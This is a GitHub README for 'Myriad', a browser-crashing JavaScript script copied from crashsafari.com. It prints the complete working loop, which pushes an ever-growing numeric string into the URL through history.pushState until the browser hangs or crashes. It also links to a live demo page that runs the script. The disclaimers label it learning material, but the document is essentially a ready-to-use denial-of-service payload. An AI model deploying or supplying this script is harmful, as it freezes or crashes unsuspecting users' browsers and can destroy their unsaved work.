# Myriad

Simple JS script that overloads the browser with a huge URL (Where it gets its name)

## Demo

Why GIFs when you can see it working live? Visit [this](https://maximousblk.github.io/myriad/) link **ON YOUR OWN RISK**. I am not responsible for any harm due to this page...... warned ya!

## The url

You can see an example of the generated URL in [SAMPLE-URL.md](https://github.com/maximousblk/myriad/blob/master/SAMPLE-URL.md), its huge and note the pattern (123456789101112131415....)

## The code

The code is super simple!

The code exploits the [HTML5 pushState](https://developer.mozilla.org/en-US/docs/Web/API/History_API) API used on all modern browsers to update the path of the site you are visiting during JavaScript page navigation.

Instead of just changing the path from `website.com/pageone` to `website.com/pagetwo` it creates a string of numbers long enough to slow the browser until it won't function, hang, or crash.

```javascript
var total = ""; //blank variable
for( var i = 0; i < 10000000; i++ ) { //increases the value of 'i' by 1 till it becomes 10000000
total = total + i.toString(); //adds the value of 'i' to total everytime it increases
history.pushState(0,0, total ); //sends the value of total to the url to load
} //The End XD
```

## Need for Myriad

No one is ever gonna need it (To Say Nothing Of The Naughty Ones)

This script is in the mischievous websites like [crashsafari.com](https://crashsafari.com), [crashchrome.com](http://crashchrome.com), etc.

You better don't do so!

Original code taken from [crashsafari.com](http://crashsafari.com)

## Disclaimer

* This piece of code is open and I am not the creator or owner of this script.
* It is only for learning and research purpose.
* I am not responsible for any destruction or harm caused due to this program/code.
* No systems (hardware/software) were harmed during the making of this program/code

## License

This program/code is licensed under the [Unlicense](http://unlicense.org).